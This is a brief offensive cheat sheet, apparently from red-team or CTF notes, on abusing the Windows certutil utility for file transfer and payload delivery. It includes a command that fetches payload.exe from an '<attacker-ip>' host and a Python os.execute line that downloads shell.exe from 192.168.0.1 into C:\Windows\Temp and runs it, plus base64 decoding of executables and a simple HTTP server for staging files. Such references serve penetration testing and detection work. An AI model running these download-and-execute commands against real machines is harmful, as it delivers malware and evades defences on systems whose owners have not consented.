# certutil

```
Description: certutil is a built-in Windows command-line utility used primarily for managing certificates
but in hacking, CTFs, and red teaming, often abused for file transfer, decoding, and living-off-the-land (LOLBin) attacks

# Legit Use (Sysadmin Purpose)
certutil -store my                          # List personal certificates
certutil -addstore root cert.cer            # Add a cert to the root store

# Download Files from a Remote Server
certutil -urlcache -split -f http://<attacker-ip>/payload.exe payload.exe

# Base64 Decode a File
certutil -decode encoded.txt decoded.exe

# Base64 Encode a File
certutil -encode input.exe encoded.txt

Download & Execute Python Command
os.execute('cmd.exe /c certutil.exe -urlcache -split -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe & C:\Windows\Temp\shell.exe')
```

# Alternative Transferring files
```
# Important: Create HTTP server serving files in current directory on port 8000
python -m SimpleHTTPServer 8000

# Download files from above server on linux
wget 10.0.0.X/filename.sh

# Download files from above server on Windows
certutil -urlcache -f http://10.0.0.X:8000/filename.sh
```

## Back to README.md
[BACK](/README.md)